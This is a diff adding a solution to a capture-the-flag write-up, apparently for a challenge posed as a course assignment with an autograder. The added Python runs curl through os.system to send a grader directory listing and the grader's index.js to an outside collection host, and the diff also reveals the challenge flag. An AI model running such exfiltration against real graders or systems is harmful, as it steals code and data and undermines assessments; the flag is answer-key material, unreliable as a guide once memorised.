@@ -4,7 +4,15 @@ My CSCE 437 professor just released our latest programming assignment, but it se
 
 ## Solution
 
-This section will contain the reviewers solution. The flag section below should stay the same. Just replace `gigem{testing_flag}` with the challenge flag.
+```
+import os
+
+# use ls to exfil directory and file listings
+os.system("curl https://en5q5wqvzmucp.x.pipedream.net/$(ls grader | base64)")
+
+# extract index.js autograder
+os.system("curl https://en5q5wqvzmucp.x.pipedream.net/ -F=@grader/index.js")
+```
 
 flag:
-`gigem{testing_flag}`
+`gigem{d0n7_d0_7hi5_0n_y0ur_4c7u41_455i9nm3n75}`
